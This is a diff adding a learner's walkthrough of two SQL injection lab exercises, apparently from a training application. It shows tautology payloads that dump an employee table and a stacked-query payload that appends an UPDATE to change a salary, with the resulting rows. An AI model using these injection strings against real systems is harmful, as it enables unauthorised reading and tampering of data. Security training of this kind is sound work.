@@ -158,5 +158,53 @@ userid = 0 OR 1=1
 Success.  
 <img src="Pictures/SQLInj10Success.png" width="50%">
 
+### 11
+
+This was a trial and error run again for me.  
+At first I just looked into what my, John Smith's, data looks like.  
+Then I had some trouble with the syntax. How to place the quotation marks in the injected code.  
+Tried with input:  
+Name: Smith' OR 'i'='i'  
+TAN: 3SL99A  
+This resulted in a failure "malformed string". So I decided to take closer look at the original query:  
+"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
+Placing my little piece here it would look like:  
+"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i'' AND auth_tan = '3SL99A';  
+The issue can be clearly seen in the extra quotation mark after the second 'i'. Even if fixed, the auth_tan would ruin my attempt so a revised version:  
+Input: Smith' OR 'i'='i  
+TAN: 3SL99A' OR 'i'='i  
+The full query is:  
+"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';
+This one was a success as both test are always true but I did leave some traces of my actions as I used my actual name and TAN number with the injections. I could have input any random strings to be safe. Too late now.  
+
+USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
+32147	Paulina	    Travers	    Accounting	46000	P45JSI
+34477	Abraham	    Holman	    Development	50000	UU2ALK
+37648	John	    Smith	    Marketing	64350	3SL99A
+89762	Tobi	    Barnett	    Development	77000	TA9LL1
+96134	Bob	        Franco	    Marketing	83700	LO9S2V
+
+### 12
+
+This one was a pretty straight forward one after realizing the the syntax in the previous.  
+So the original query again:  
+"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
+Input:  
+Name: Fairy  
+TAN: Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A  
+The query being sent to the server would look like this:  
+SELECT * FROM employees WHERE last_name = 'Fairy' AND auth_tan = 'Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A'  
+  
+A big payraise for John Smith succesful.
+USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
+37648	John	    Smith	    Marketing	99001	3SL99A
+96134	Bob	        Franco	    Marketing	83700	LO9S2V
+89762	Tobi	    Barnett	    Development	77000	TA9LL1
+34477	Abraham	    Holman	    Development	50000	UU2ALK
+32147	Paulina	    Travers	    Accounting	46000	P45JS
+
+
+
+
 
 
